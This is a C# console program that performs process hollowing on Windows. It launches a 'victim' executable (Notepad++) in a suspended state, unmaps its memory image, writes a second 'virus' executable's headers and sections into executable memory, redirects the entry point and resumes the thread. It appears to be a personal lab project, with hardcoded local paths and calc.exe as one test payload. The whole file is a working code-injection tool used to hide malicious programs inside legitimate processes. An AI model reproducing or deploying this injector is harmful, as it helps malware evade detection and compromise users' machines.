using ProcessInjector;
using System;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;

namespace ConsoleApp1
{
    class Program
    {
        private static IntPtr Allocate(int size, int alignment)
        {
            IntPtr allocated = Marshal.AllocHGlobal(size + (alignment / 2));
            return Align(allocated, alignment);
        }
        private static IntPtr Align(IntPtr source, int alignment)
        {
            long source64 = source.ToInt64() + (alignment - 1);
            long aligned = alignment * (source64 / alignment);
            return new IntPtr(aligned);
        }


        static void Main(string[] args)
        {
            //Paths to our files
            string victimPath = @"D:\Program Files\Notepad++\notepad++.exe";
            string virusPath = @"C:\Windows\System32\calc.exe";
            virusPath = @"C:\Users\Razali\source\repos\WindowsPE\x64\Release\Project2.exe";
            virusPath = @"D:\Program Files\GNS3\TvnViewer.exe";
            byte[] victimFileBytes = File.ReadAllBytes(victimPath);
            IntPtr victimFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(victimFileBytes, 0);


            byte[] virusFileBytes = File.ReadAllBytes(virusPath);
            IntPtr virusFilePointer = Marshal.UnsafeAddrOfPinnedArrayElement(virusFileBytes, 0);


            Console.WriteLine($"Injecting {Path.GetFileName(virusPath)} into {Path.GetFileName(victimPath)}");

            #region Create Victim Process in Suspended State 
            Console.WriteLine($"[+] Creating Victim Process {Path.GetFileName(victimPath)}");
            PInvoke.STARTUPINFO startupInfo = new PInvoke.STARTUPINFO();
            PInvoke.PROCESS_INFORMATION processInformation = new PInvoke.PROCESS_INFORMATION();

            bool couldNotCreateProcess = !PInvoke.CreateProcess(
                                                lpApplicationName: null,
                                                lpCommandLine: victimPath,
                                                lpProcessAttributes: IntPtr.Zero,
                                                lpThreadAttributes: IntPtr.Zero,
                                                bInheritHandles: false,
                                                dwCreationFlags: PInvoke.CreationFlags.SUSPENDED,
                                                lpEnvironment: IntPtr.Zero,
                                                lpCurrentDirectory: null,
                                                ref startupInfo,
                                                ref processInformation
                                            );
            if (couldNotCreateProcess)
            {
                Console.WriteLine("[*] Failed to create victim process...");
                return;
            }

            Console.WriteLine($"\t[*] Successfully created victim process {Path.GetFileName(victimPath)}");

            #endregion



            #region Getting ThreadContext

            //I need  threadHandle and threadContext
            Console.WriteLine($"[+] Retrieving Thread Handle of {Path.GetFileName(victimPath)}");
            IntPtr victimThreadHandle = processInformation.hThread;
            Console.WriteLine($"\t[*] Thread Handle at  0x{(long)victimThreadHandle:X2}");

            Console.WriteLine($"[+] Allocating unmanaged memory for ThreadContext of {Path.GetFileName(victimPath)}");
            PInvoke.CONTEXT64 victimThreadContext = new PInvoke.CONTEXT64() { ContextFlags = PInvoke.CONTEXT_FLAGS.CONTEXT_ALL };
            IntPtr pVictimThreadContext = Allocate(Marshal.SizeOf<PInvoke.CONTEXT64>(), 16);


            Marshal.StructureToPtr<PInvoke.CONTEXT64>(victimThreadContext, pVictimThreadContext, false);

            Console.WriteLine($"[+] Retrieving ThreadContext of {Path.GetFileName(victimPath)}");
            PInvoke.GetThreadContext(victimThreadHandle, pVictimThreadContext);

            victimThreadContext = Marshal.PtrToStructure<PInvoke.CONTEXT64>(pVictimThreadContext);

            #endregion

            #region Get Victim Image Base
            Console.WriteLine($"[+] Retrieving ImageBase Address of {Path.GetFileName(victimPath)}");
            ulong rdx = victimThreadContext.Rdx;
            ulong victimImageBaseAddress = rdx + 16;
            Console.WriteLine($"\t[*] {Path.GetFileName(victimPath)}'s ImageBase Address is 0x{victimImageBaseAddress:X2}");

            IntPtr victimProcessHandle = processInformation.hProcess;

            Console.WriteLine($"[+] Allocating unmanaged memory for {Path.GetFileName(victimPath)}'s ImageBase");
            IntPtr victimImageBase = Marshal.AllocHGlobal(8);
            Console.WriteLine($"[+] Reading ImageBase from {Path.GetFileName(victimPath)}'s ImageBase Address");
            PInvoke.ReadProcessMemory(victimProcessHandle, victimImageBaseAddress, victimImageBase, 8, out _);
            Console.WriteLine($"\t[*] ImageBase is 0x{victimImageBaseAddress:X2}");
            #endregion
            #region Unmap old data
            Console.WriteLine($"[+] Unmapping {Path.GetFileName(victimPath)}'s Image");
            if (PInvoke.ZwUnmapViewOfSection(victimProcessHandle, victimImageBase) == PInvoke.NTSTATUS.STATUS_ACCESS_DENIED)
            {
                Console.WriteLine("\t[*] Failed to unmap section...");
                return;
            }
            Console.WriteLine("\t[*] Successfully unmapped...");
            #endregion

            #region Allocate Space for virus image
            Console.WriteLine($"[+] Retrieving E_LFANEW of {Path.GetFileName(virusPath)}");
            int virusElfanew = Marshal.ReadInt32(virusFilePointer, PInvoke.Offsets.E_LFANEW);
            Console.WriteLine($"\t[*] E_LFANEW is 0x{virusElfanew:X2}");

            Console.WriteLine($"[+] Retrieving {Path.GetFileName(virusPath)}'s ImageBase");
            long virusImageBase = Marshal.ReadInt64(virusFilePointer, virusElfanew + 0x30);
            Console.WriteLine($"\t[*] ImageBase is 0x{virusImageBase:X2}");
            Console.WriteLine($"[+] Retrieving Size of {Path.GetFileName(virusPath)}");
            uint sizeOfVirusImage = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x50);
            Console.WriteLine($"\t[*] Size is 0x{sizeOfVirusImage:X2}");

            Console.WriteLine($"[+] Allocating space for {Path.GetFileName(virusPath)}'s Image");
            IntPtr allocatedNewRegionForVirus =  PInvoke.VirtualAllocEx(victimProcessHandle, (IntPtr)virusImageBase, sizeOfVirusImage, PInvoke.AllocationType.Reserve | PInvoke.AllocationType.Commit, PInvoke.MemoryProtection.ExecuteReadWrite);
            Console.WriteLine($"\t[*] Space allocated at 0x{allocatedNewRegionForVirus:X2}");
            #endregion

            #region Write new headers
            Console.WriteLine($"[+] Retrieving {Path.GetFileName(virusPath)}'s Header Size");
            uint sizeOfVirusHeaders = (uint)Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x54);
            Console.WriteLine($"\t[*] Header Size is 0x{sizeOfVirusHeaders:X2}");

            Console.WriteLine($"[+] Writing Headers of {Path.GetFileName(virusPath)} into {Path.GetFileName(victimPath)} at 0x{allocatedNewRegionForVirus:X2}");
            
            if (!PInvoke.WriteProcessMemory(victimProcessHandle, allocatedNewRegionForVirus, virusFilePointer, sizeOfVirusHeaders, out _))
            {
                Console.WriteLine("\t[*] Writing headers failed...");
                return;
            };
            Console.WriteLine("\t[*] Headers successfully written...");
            #endregion

            #region Write Sections and relocate if necessary

            Console.WriteLine($"[+] Retrieving {Path.GetFileName(virusPath)}'s number of Sections");
            int numberOfSections = Marshal.ReadInt16(virusFilePointer, virusElfanew + 0x6);
            Console.WriteLine($"\t[*] Number of sections is  {numberOfSections}");

            int sizeOfOptionalHeader = Marshal.ReadInt16(virusFilePointer + virusElfanew + 0x10 + 0x04);
            int sizeOfImageSectionHeader = Marshal.SizeOf<PInvoke.IMAGE_SECTION_HEADER>();
            
            for (int i = 0; i < numberOfSections; i++)
            {
                Console.WriteLine($"[+] Copying Section {i+1}");
                IntPtr sectionHeaderPointer = virusFilePointer + virusElfanew + 0x18 + sizeOfOptionalHeader + (i * sizeOfImageSectionHeader);
                PInvoke.IMAGE_SECTION_HEADER sectionHeader = Marshal.PtrToStructure<PInvoke.IMAGE_SECTION_HEADER>(sectionHeaderPointer);
                Console.WriteLine($"\t[*] Name: {String.Join("", sectionHeader.Name.Select(o => o.ToString()).ToArray())}");
                uint virtualAddress = sectionHeader.VirtualAddress;
                Console.WriteLine($"\t[*] Relative Virtual Address: 0x{virtualAddress:X2}");
                uint sizeOfRawData = sectionHeader.SizeOfRawData;
                Console.WriteLine($"\t[*] Size of Raw Data: 0x{sizeOfRawData:X2}");
                uint pointerToRawData = sectionHeader.PointerToRawData;
                Console.WriteLine($"\t[*] Pointer to Raw Data: 0x{pointerToRawData:X2}");

                byte[] bRawData = new byte[sizeOfRawData];
                Buffer.BlockCopy(virusFileBytes, (int)pointerToRawData, bRawData, 0, bRawData.Length);

                PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)(virusImageBase + virtualAddress), Marshal.UnsafeAddrOfPinnedArrayElement(bRawData, 0), (uint)bRawData.Length, out _);
                Console.WriteLine();
            }
            #endregion
           

            #region Rewrite Victim ImageBase to Virus ImageBase
            byte[] bImageBase = BitConverter.GetBytes((long)virusImageBase);

            Console.WriteLine($"[+] ReWriting {Path.GetFileName(virusPath)}'s ImageBase 0x{virusImageBase:X2} in memory");
            if (!PInvoke.WriteProcessMemory(victimProcessHandle, (IntPtr)victimImageBaseAddress, bImageBase, 0x8, out _))
            {
                Console.WriteLine("\t[*]Rewriting image base failed...");
                return;
            }
            Console.WriteLine($"\t[*] ImageBase rewriting successful...");
            #endregion

            #region Rewrite Victim EntryPoint to Virus EntryPoint
            Console.WriteLine($"[+] ReWriting {Path.GetFileName(virusPath)}'s EntryPoint 0x{virusImageBase:X2} in ThreadContext");
            int virusEntryPointRVA = Marshal.ReadInt32(virusFilePointer, virusElfanew + 0x28);
            victimThreadContext.Rcx = (ulong)allocatedNewRegionForVirus +  (ulong)virusEntryPointRVA;
            Marshal.StructureToPtr(victimThreadContext, pVictimThreadContext, true);
            Console.WriteLine($"\t[*] EntryPoint rewriting successful...");

            Console.WriteLine($"[+] Setting ThreadContext");
            PInvoke.SetThreadContext(victimThreadHandle, pVictimThreadContext);
            #endregion

            Console.WriteLine($"[+] All set and ready to go!");
            Console.WriteLine($"[+] Resuming Thread...");
            PInvoke.ResumeThread(victimThreadHandle);


            Marshal.FreeHGlobal(pVictimThreadContext);
            Marshal.FreeHGlobal(victimImageBase);
        }
    }
}
